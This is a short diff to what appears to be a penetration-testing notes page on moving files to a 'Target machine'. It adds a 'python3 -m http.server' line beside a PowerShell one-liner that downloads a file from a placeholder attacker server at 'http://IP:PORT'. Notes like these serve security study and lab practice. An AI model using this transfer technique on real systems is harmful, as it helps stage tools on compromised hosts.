@@ -139,6 +139,8 @@ Then download on the Target machine:
 
 ![](attachments/20240311162555.png)
 
+`python3 -m http.server`
+
 ```powershell
 powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://IP:PORT/file', 'C:\file')"
 ```
